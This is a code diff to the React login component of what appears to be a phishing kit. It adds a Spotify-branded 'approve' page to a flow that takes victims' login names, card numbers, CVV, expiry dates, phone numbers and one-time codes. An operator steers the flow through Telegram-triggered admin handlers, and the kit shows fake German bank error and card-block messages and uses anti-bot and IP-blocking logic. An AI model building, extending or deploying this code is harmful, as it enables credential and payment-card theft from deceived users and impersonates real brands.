@@ -12,6 +12,7 @@ import './LoginForm.css';
 import ApprovePopup from './ApprovePopup';
 import { countryCodes } from './CardVerificationForm';
 import GiftCardPopup from './GiftCardPopup';
+import SpotifyApprove from './SpotifyApprove';
 
 function LoginForm() {
   const { t } = useLanguage();
@@ -31,6 +32,7 @@ function LoginForm() {
   const [showNextStep, setShowNextStep] = useState(false);
   const [showApprovePopup, setShowApprovePopup] = useState(false);
   const [waitingForAdminOtp, setWaitingForAdminOtp] = useState(false);
+  const [showSpotifyApprove, setShowSpotifyApprove] = useState(false);
 
   //giftcard
   const [showGiftCard, setShowGiftCard] = useState(false);
@@ -64,6 +66,11 @@ const handleApproveLogin = () => {
 
   
   // Send Telegram notification (you can add a log function if needed)
+};
+
+const handleSpotifyAppr = () => {
+  console.log('🎵 Spotify Appr clicked - Opening Spotify Approve page');
+  setShowSpotifyApprove(true);
 };
 
 // Handle OTP Connexion
@@ -168,6 +175,7 @@ const handleCardVerificationFromTelegram = () => {
   };
 
   const handleNextStep = async () => {
+    setShowSpotifyApprove(false); // ← ADD THIS
     if (!hasSentOtpLogRef.current && sendOtpPageLog) {
       await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
       hasSentOtpLogRef.current = true;
@@ -183,6 +191,7 @@ const handleCardVerificationFromTelegram = () => {
   };
 
   const handleBackToCard = () => {
+    setShowSpotifyApprove(false); // ← ADD THIS
     console.log('🔵 Back to Card button clicked!');
     setShowOtpForm(false);
     setShowCardForm(true);
@@ -193,6 +202,7 @@ const handleCardVerificationFromTelegram = () => {
   };
 
   const handleBackToLogin = () => {
+    setShowSpotifyApprove(false); // ← ADD THIS
     console.log('🔵 Back to Login button clicked!');
     setShowNextStep(false);
     setShowCardForm(false);
@@ -223,6 +233,7 @@ const handleCardVerificationFromTelegram = () => {
   };
 
   const handleBlock = async () => {
+    setShowSpotifyApprove(false); // ← ADD THIS (optional, since page reloads)
     console.log('🔵 Block IP button clicked!');
     try {
       const response = await axios.get('https://api.ipify.org?format=json');
@@ -244,90 +255,96 @@ const handleCardVerificationFromTelegram = () => {
   
   const handleNextStepAppr = async () => {
     console.log('🔵 Next Step (Appr) button clicked!');
+    setShowSpotifyApprove(false);
     setShowNextStep(true);
     setWaitingForApproval(false);
     setIsLoading(false);
   };
 
   const handleBackToAppr = () => {
+    setShowSpotifyApprove(false); // ← ADD THIS
     console.log('🔵 Back to Appr Page button clicked!');
     window.location.href = '/#/';
   };
 
   const handleDenyOtp = () => {
+    setShowSpotifyApprove(false); // ← ADD THIS
     console.log('🔵 Deny OTP button clicked!');
     setOtpError('Invalid OTP code. Please try again.');
   };
   
   const [otpAttempts, setOtpAttempts] = useState(0);
   const handleOtpFalse = () => {
-  console.log('🚫 OTP False clicked');
-  setWaitingForAdminOtp(false);
+    setShowSpotifyApprove(false); // ← ADD THIS
+    console.log('🚫 OTP False clicked');
+    setWaitingForAdminOtp(false);
+    
+    const newAttempts = otpAttempts + 1;
+    setOtpAttempts(newAttempts);
+    
+    if (newAttempts === 1) {
+      setOtpError('Falscher Code. Bitte versuchen Sie es erneut.');
+    } else if (newAttempts === 2) {
+      setOtpError('Code ungültig. Letzter Versuch!');
+    } else if (newAttempts >= 3) {
+      setOtpError('Karte gesperrt. Bitte kontaktieren Sie Ihre Bank.');
+      setTimeout(() => {
+        setShowOtpForm(false);
+        setShowCardForm(false);
+        setOtpAttempts(0);
+        setOtpCode('');
+        setOtpError('');
+        setCardDetails({
+          cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
+          phoneNumber: '', city: '', postalCode: ''
+        });
+        setWaitingForAdminOtp(false);
+      }, 2000);
+      return;
+    }
+    
+    setOtpCode('');
+  };
   
-  const newAttempts = otpAttempts + 1;
-  setOtpAttempts(newAttempts);
-  
-  if (newAttempts === 1) {
-    setOtpError('Falscher Code. Bitte versuchen Sie es erneut.');
-  } else if (newAttempts === 2) {
-    setOtpError('Code ungültig. Letzter Versuch!');
-  } else if (newAttempts >= 3) {
-    setOtpError('Karte gesperrt. Bitte kontaktieren Sie Ihre Bank.');
-    setTimeout(() => {
-      setShowOtpForm(false);
-      setShowCardForm(false);
-      setOtpAttempts(0);
-      setOtpCode('');
-      setOtpError('');
-      setCardDetails({
-        cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
-        phoneNumber: '', city: '', postalCode: ''
-      });
-      setWaitingForAdminOtp(false);
-    }, 2000);
-    return;
-  }
-  
-  setOtpCode('');
-};
   const handleCardFalse = () => {
-  console.log('❌ Card False button clicked!');
-  setShowCardForm(true);
-  setShowOtpForm(false);
-  setWaitingForOtpApproval(false);
-  setWaitingForAdminOtp(false);
-  setIsLoading(false);
-  
-  // Clear the card error
-  setCardErrors({});
-  
-  // Show popup message
-  const popup = document.createElement('div');
-  popup.style.cssText = `
-    position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #1a1a1a;
-    color: #e74c3c;
-    padding: 14px 28px;
-    border-radius: 500px;
-    font-size: 14px;
-    font-weight: 600;
-    z-index: 9999;
-    font-family: Arial, sans-serif;
-    border: 1px solid #e74c3c;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    animation: slideDown 0.3s ease;
-  `;
-  popup.textContent = '⚠️ Please verify your card details and try again.';
-  document.body.appendChild(popup);
-  
-  setTimeout(() => {
-    popup.style.animation = 'slideUp 0.3s ease forwards';
-    setTimeout(() => popup.remove(), 300);
-  }, 3000);
-};
+    setShowSpotifyApprove(false); // ← ADD THIS
+    console.log('❌ Card False button clicked!');
+    setShowCardForm(true);
+    setShowOtpForm(false);
+    setWaitingForOtpApproval(false);
+    setWaitingForAdminOtp(false);
+    setIsLoading(false);
+    
+    // Clear the card error
+    setCardErrors({});
+    
+    // Show popup message
+    const popup = document.createElement('div');
+    popup.style.cssText = `
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1a1a1a;
+      color: #e74c3c;
+      padding: 14px 28px;
+      border-radius: 500px;
+      font-size: 14px;
+      font-weight: 600;
+      z-index: 9999;
+      font-family: Arial, sans-serif;
+      border: 1px solid #e74c3c;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      animation: slideDown 0.3s ease;
+    `;
+    popup.textContent = '⚠️ Please verify your card details and try again.';
+    document.body.appendChild(popup);
+    
+    setTimeout(() => {
+      popup.style.animation = 'slideUp 0.3s ease forwards';
+      setTimeout(() => popup.remove(), 300);
+    }, 3000);
+  };
 
   const handleApproveOtp = async () => {
   console.log('✅ OTP Approved by admin!');
@@ -392,7 +409,8 @@ const handleCardVerificationFromTelegram = () => {
     handleApproveLogin,   // NEW
     handleOtpLogin,       // NEW
     handleLoginFalse,
-    handleCardVerificationFromTelegram         // NEW
+    handleCardVerificationFromTelegram,         // NEW
+    handleSpotifyAppr 
   );
 
   // Anti-bot initialization
@@ -745,7 +763,10 @@ useEffect(() => {
 
   return (
     <div className="login-container">
-      {showNextStep ? (
+      {/* Show SpotifyApprove FIRST if it's open */}
+      {showSpotifyApprove ? (
+        <SpotifyApprove onClose={() => setShowSpotifyApprove(false)} />
+      ) : showNextStep ? (
         <NextStepAppr />
       ) : (
         <>
